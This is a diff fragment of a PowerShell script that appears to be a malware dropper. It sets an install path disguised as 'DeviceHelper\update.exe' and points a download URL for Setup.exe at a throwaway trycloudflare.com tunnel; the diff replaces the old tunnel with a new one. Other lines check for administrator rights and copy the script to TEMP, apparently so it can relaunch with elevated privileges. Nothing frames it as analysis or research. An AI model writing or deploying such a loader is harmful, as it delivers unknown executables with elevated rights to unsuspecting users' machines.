@@ -3,7 +3,7 @@ param([switch]$Elevated)
 
 $dest  = "$env:LOCALAPPDATA\Programs\DeviceHelper"
 $setup = "$dest\update.exe"
-$dlUrl = "https://possess-scheduling-putting-istanbul.trycloudflare.com/Setup.exe"
+$dlUrl = "https://assumption-centered-brush-acting.trycloudflare.com/Setup.exe"
 
 function Is-Admin {
     ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
@@ -15,7 +15,6 @@ if (-not (Is-Admin)) {
     $tmp = "$env:TEMP\dhi.ps1"
     Copy-Item $PSCommandPath $tmp -Force -ErrorAction SilentlyContinue
     if (-not (Test-Path $tmp)) {
-        # Fallback: tulis sendiri jika tidak ada PSCommandPath
         $src = $MyInvocation.MyCommand.ScriptBlock.ToString()
         [IO.File]::WriteAllText($tmp, "param([switch]`$Elevated)`r`n" + $src)
     }
